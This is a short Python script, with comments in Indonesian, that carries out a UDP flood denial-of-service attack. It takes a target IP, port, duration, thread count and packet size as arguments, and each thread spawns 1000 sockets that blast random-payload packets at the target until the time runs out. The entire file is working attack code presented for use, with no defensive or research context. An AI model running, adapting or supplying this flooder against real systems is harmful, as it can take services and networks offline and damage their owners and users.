import socket
import threading
import sys
import os
import time

def UDP_ATTACK(s, size, addr, duration):
    start_time = time.time()
    try:
        while time.time() - start_time < duration:  # Berhenti setelah waktu habis
            try:
                [s.sendto(os.urandom(size), addr) for _ in range(1000)]  # 1000 paket/iterasi
            except socket.error as e:
                print(f"Socket error: {e}. Reconnecting...")
                s.close()
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, size * 1000)
    except Exception as e:
        print(f"UDP_ATTACK error: {e}")
    finally:
        s.close()  # Tutup socket setelah selesai

def SOC(addr, size, duration):
    try:
        for _ in range(1000):  # 1000 socket per thread utama
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, size * 1000)  # Optimasi buffer
            threading.Thread(target=UDP_ATTACK, args=(s, size, addr, duration)).start()
    except Exception as e:
        print(f"SOC error: {e}")

def main():
    # Parameter: IP, PORT, DURATION (detik), THREAD, SIZE
    if len(sys.argv) != 6:
        print("Usage: python script.py <IP> <PORT> <DURATION> <THREAD> <SIZE>")
        sys.exit(1)

    ip, port, duration, thread, size = sys.argv[1], int(sys.argv[2]), int(sys.argv[3]), int(sys.argv[4]), int(sys.argv[5])

    # Jalankan serangan
    threads = []
    for _ in range(thread):
        t = threading.Thread(target=SOC, args=((ip, port), size, duration))
        t.start()
        threads.append(t)

    # Tunggu semua thread selesai
    for t in threads:
        t.join()

    print("Serangan selesai. Script akan keluar.")
    sys.exit(0)  # Keluar otomatis setelah selesai

if __name__ == "__main__":
    main()